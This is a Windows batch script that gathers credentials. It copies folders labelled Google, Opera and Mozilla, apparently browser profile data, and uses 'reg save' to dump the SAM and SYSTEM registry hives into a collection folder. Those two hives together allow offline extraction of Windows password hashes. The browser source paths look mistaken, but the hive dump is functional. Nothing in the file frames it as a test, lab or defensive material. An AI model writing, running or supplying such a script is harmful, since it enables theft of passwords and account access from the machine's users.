@echo off
setlocal

rem Set the target folder located in the batch file's directory
set "target_0=target_folder_dis/Google"
set "target_1=target_folder_dis/Opera"
set "target_2=target_folder_dis/Mozilla"
set "target_3=target_folder_dis/Windows"
set "target_4=c:\sam"
set "target_5=c:\system"
set "target_6=target_folder_dis/Windows/sam"
set "target_7=target_folder_dis/Windows/system"

rem Ensure the target folder exists
if not exist "%target_0%" (
    mkdir "%target_0%"
)

if not exist "%target_1%" (
    mkdir "%target_1%"
)

if not exist "%target_2%" (
    mkdir "%target_2%"
)

if not exist "%target_3%" (
    mkdir "%target_3%"
)

if not exist "%target_6%" (
    mkdir "%target_6%"
)

if not exist "%target_7%" (
    mkdir "%target_7%"
)

rem Define an array of source folders
set "sources_0=C:\Google"
set "sources_1=C:\Opera"
set "sources_2=C:\Mozilla"
set "source_3=C:\Windows\System32\config\SAM"
set "source_4=hklm\sam"
set "source_5=hklm\system"
set "source_6=C:\sam"
set "source_7=C:\system"

robocopy "%sources_0%" "%target_0%" /E
robocopy "%sources_1%" "%target_1%" /E
robocopy "%sources_2%" "%target_2%" /E
rem copy "%source_3%" "%target_3%" /Y
reg save "%source_4%" "%target_4%" /Y
reg save "%source_5%" "%target_5%" /Y
copy "%source_6%" "%target_6%" /Y
copy "%source_7%" "%target_7%" /Y

rem pause

endlocal
